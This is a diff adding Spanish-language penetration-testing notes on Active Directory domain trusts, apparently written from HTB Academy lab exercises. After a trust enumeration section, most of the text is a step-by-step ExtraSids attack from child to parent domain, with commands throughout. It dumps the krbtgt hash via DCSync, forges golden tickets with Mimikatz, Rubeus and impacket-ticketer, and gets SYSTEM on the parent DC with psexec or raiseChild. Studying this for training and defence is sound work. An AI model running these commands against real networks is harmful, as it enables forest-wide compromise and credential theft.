@@ -1041,3 +1041,157 @@ Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 **Explotación:** **SharpGPOAbuse** (cuidado con el *blast radius* — afecta a toda la OU vinculada). También se puede auditar con `group3r`, `ADRecon`, `PingCastle`.
 
 También se puede ver esto con Bloodhound.
+
+# Domain Trust
+
+Tipos:
+- `Parent-child`Dos o más dominios dentro del mismo bosque. El dominio hijo tiene una relación de confianza transitiva bidireccional con el dominio padre, lo que significa que los usuarios del dominio hijo `corp.inlanefreight.local`pueden autenticarse en el dominio padre `inlanefreight.local`y viceversa.
+- `Cross-link`: Una relación de confianza entre dominios secundarios para acelerar la autenticación.
+- `External`: Una relación de confianza no transitiva entre dos dominios separados en bosques distintos que no están unidos por una relación de confianza entre bosques. Este tipo de relación utiliza [el filtrado por SID](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) o filtra las solicitudes de autenticación (por SID) que no provienen del dominio de confianza.
+- `Tree-root`: Una relación de confianza transitiva bidireccional entre un dominio raíz de bosque y un nuevo dominio raíz de árbol. Se crean automáticamente al configurar un nuevo dominio raíz de árbol dentro de un bosque.
+- `Forest`: Una relación de confianza transitiva entre dos dominios raíz de bosque.
+- [ESAE](https://docs.microsoft.com/en-us/security/compass/esae-retirement) : Un bosque bastión utilizado para administrar Active Directory.
+
+
+## Enumeración
+```
+Import-Module activedirectory
+
+Get-ADTrust -Filter *
+```
+`IntraForest` es el que dice si es hijo o no
+`ForestTransitive` es el que dice si es externo o no
+
+```
+Import-Module PowerView.ps1
+
+Get-DomainTrust
+
+Get-DomainTrustMapping
+```
+
+Una vez obtenido todos los dominios de confianza podemos por ejemplo listar sus usuarios:
+```
+Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+```
+
+>[!Note]
+>También se puede hacer directamente desde Bloodhound
+### Enumeración con Netdom
+```
+netdom query /domain:inlanefreight.local trust
+
+netdom query /domain:inlanefreight.local dc
+
+netdom query /domain:inlanefreight.local workstation
+```
+
+## Attacking Domain Trusts
+Este ataque permite comprometer un dominio principal una vez que el dominio secundario ha sido comprometido.
+El ataque consiste en la confianza y los SID (Security Identifier), por que si un usuario en el dominio hijo tiene un grupo administrador este SID se traspasará al dominio principal por el SID por lo que también será administrador en el Dominio padre. Esto funciona así para que a la hora de migrar/adquirir dominios nuevos un usuario del dominio nuevo pueda seguir accediendo a sus recursos.
+### Desde Windows
+#### ExtraSids - Mimikatz
+Consiste en hacer un Golden ticket
+
+Cosas necesarias para poder hacer el ataque:
+* El hash KRBTGT del dominio hijo
+* El SID del dominio hijo
+* El nombre de un usuario objetivo (¡No tiene que existir!)
+* El FQDN del dominio hijo
+* El SID del grupo Administradores Empresariales del dominio raíz
+
+``` Mimikatz
+lsadump::dcsync /user:[DOMINIO]\krbtgt
+```
+
+```
+Import-Module PowerView.ps1
+
+Get-DomainSID
+```
+
+```
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+Con estos tres comandos ya obtenemos todos los datos que necesitamos para el ataque.
+
+Ahora hacemos el Golden Ticket con mimikatz:
+``` Mimikatz
+kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:[SID_GRUPO_ADMIN] /krbtgt:[HASH_KRBTGT] /sids:[SID_DOMINIO_HIJO] /ptt
+```
+O con la variante de Rubeus:
+```
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+```
+
+Y confirmamos que se nos ha importado bien el ticket con:
+```
+klist
+```
+
+Y ya podríamos acceder a recursos del dominio padre:
+```
+ls \\academy-ea-dc01.inlanefreight.local\c$
+```
+
+En HTB después de conseguir esto hace un ataque de DCSync:
+``` Mimikatz
+lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+
+# En algunos casos necesitamos especificar más:
+
+lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+```
+
+### Desde Linux
+ Para hacerlo desde linux el mismo ataque que en Windows tendremos que recopilar la misma información:
+* El hash KRBTGT del dominio hijo
+* El SID del dominio hijo
+* El nombre de un usuario objetivo (¡No tiene que existir!)
+* El FQDN del dominio hijo
+* El SID del grupo Administradores Empresariales del dominio raíz
+
+Primero sacamos el hash de krbtgt:
+```
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+```
+
+Después para sacar el SID del hijo podemos hacerlo mediante fuerza bruta con lookupsid.py de impacket apuntando a la IP del DC del dominio hijo:
+```
+impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+```
+A esto podemos hacerle un grep para filtrar por solo lo que necesitamos `grep "Domain SID"`
+
+Para la SID del dominio lo mismo pero con la IP del DC padre:
+```
+impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+```
+
+>[!Note]
+>Aqui será [SID_QUE_SALE_ARRIBA]-[NUMERO_IZQUIERDA_ENTERPRISE_ADMINS]
+
+Y con esto tendríamos todo lo de la lista, por lo que procederemos a crear un golden ticket con ticketer de la suite de impacket:
+```
+impacket-ticketer -nthash [HASH_KRBTGT] -domain [HIJO.DOMAIN.LOCAL] -domain-sid [SID_DOMINIO_HIJO] -extra-sid [SID_GRUPO_ADMIN] [USER_INVENTADO]
+```
+
+Esto nos dará un archivo.ccache, para usarlo podremos hacerlo con:
+```
+export KRB5CCNAME=[ARCHIVO.ccache]
+```
+
+Ahora si todo ha salido bien podremos acceder como SYSTEM al DC, vamos a probarlo:
+```
+psexec.py [HIJO.DOMINIO.LOCAL]/[USER_INVENTADO]@[DC_HOSTNAME.DOMAIN.LOCAL] -k -no-pass -target-ip [DC_IP]
+```
+
+#### Manera automática
+Impacket también tiene una muy buena herramienta en estos casos y es que `raiseChild` nos automatiza la escalada de privilegios del dominio hijo al dominio padre:
+```
+raiseChild.py -target-exec [DC_IP] [HIJO.DOMAIN.LOCAL]/[USER_ADMIN]
+```
+
+>[!Note]
+>Cabe destacar que aunque esto es muy jugoso ya que lo hace automático, SIEMPRE es mejor hacerlo a mano y sobre todo en una auditoria real, por que puede romper algo o fallar en algún punto por X motivos
+
+
